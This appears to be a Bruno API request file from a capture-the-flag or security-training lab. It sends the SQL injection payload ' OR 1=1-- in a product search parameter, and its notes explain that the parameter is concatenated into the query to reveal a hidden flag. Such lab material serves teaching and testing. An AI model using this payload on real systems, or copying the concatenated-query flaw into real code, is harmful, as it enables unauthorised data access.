@@ -1,0 +1,25 @@
+meta {
+  name: V06 SQLi - Basic OR 1=1
+  type: http
+  seq: 2
+}
+
+get {
+  url: {{baseUrl}}/api/products?search=' OR 1=1--
+  body: none
+  auth: none
+}
+
+docs {
+  # V06: SQL Injection - Basic
+
+  ## Vulnerability
+  Search parameter is concatenated into SQL query.
+
+  ## Exploit
+  Inject `' OR 1=1--` to bypass WHERE clause.
+
+  ## Result
+  Returns ALL products including hidden ones.
+  Hidden product contains flag in description.
+}
